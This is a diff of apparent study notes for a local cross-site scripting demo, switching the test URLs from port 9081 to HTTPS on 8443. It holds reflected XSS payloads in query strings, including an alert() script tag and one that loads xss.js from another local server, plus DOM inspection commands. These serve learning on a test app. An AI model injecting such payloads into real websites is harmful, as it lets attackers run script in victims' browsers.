@@ -1,10 +1,10 @@
 ```
-http://localhost:9081/xss-attack?xssvalue=<script>alert("XSS attack!")</script>
+https://localhost:8443/xss-attack?xssvalue=<script>alert("XSS attack!")</script>
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[2].innerHTML
 document.getElementsByTagName("*")[2].outerHTML
 
-http://localhost:9081/xss-attack?xssvalue="<script>"alert("XSS attack!")</script>
+https://localhost:8443/xss-attack?xssvalue="<script>"alert("XSS attack!")</script>
 document.getElementsByTagName('*')
 document.getElementsByTagName("*")[3].innerHTML
 document.getElementsByTagName("*")[3].outerHTML
@@ -15,7 +15,7 @@ outer HTML=HTML DOM Element in the DOM, content + HTML elements like <p>,<a>, <d
 
 https://nodeployfriday.com/posts/cors-cyber-attacks/
 
-http://localhost:9081/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js> </script>
+https://localhost:8443/xss-attack?xssvalue=<script src=http://localhost:3000/xss/xss.js> </script>
 document.getElementsByTagName('\*')
 document.getElementsByTagName("\*")[2].innerHTML
 document.getElementsByTagName("\*")[2].outerHTML
